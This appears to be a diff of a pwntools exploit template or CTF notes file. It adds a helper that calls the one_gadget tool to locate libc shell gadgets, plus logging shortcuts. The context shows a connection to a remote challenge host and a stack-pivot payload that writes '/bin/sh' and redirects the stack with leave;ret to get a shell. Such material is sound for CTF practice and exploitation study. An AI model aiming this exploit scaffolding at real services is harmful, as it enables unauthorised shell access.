@@ -41,7 +41,15 @@ if __name__ == '__main__':
     else:
         r=remote("34.45.81.67",16006)
         elf = ELF(pc)
- 
+
+# change -l0 to -l1 for more gadgets
+def one_gadget(filename, base_addr=0):
+  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
+
+# shortcuts
+def logbase(): log.info("libc base = %#x" % libc.address)
+def logleak(name, val):  log.info(name+" = %#x" % val)
+
 s = lambda *a, **k: r.send(*a, **k)
 sa = lambda s,n : r.sendafter(s,n)
 sla = lambda s,n : r.sendlineafter(s,n)
@@ -56,6 +64,8 @@ bhex = lambda b: int(b.decode(), 16)
 ru7f = lambda: r.recvuntil(b'\x7f')
 dbg = lambda: gdb.attach(r)
 dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)
+
+
 
 payload = 
 
@@ -122,6 +132,12 @@ payload += b'/bin/sh\x00'              # 真正写入 "/bin/sh" 字符串
 payload = payload.ljust(offset, b'\x00')  # 填满 overflow 前的部分
 payload += p32(leak_bss)               # 栈迁移：将 esp 指向你构造的 payload（伪造栈帧）区域
 payload += p32(leave_ret)              # 执行栈迁移：leave = mov esp, ebp; pop ebp;  ret
+```
+
+one gadget 
+```python
+onegadgets = one_gadget(libc.path, libc.address)
+logleak("one_gadget",onegadgets[1])
 ```
 
 for libc
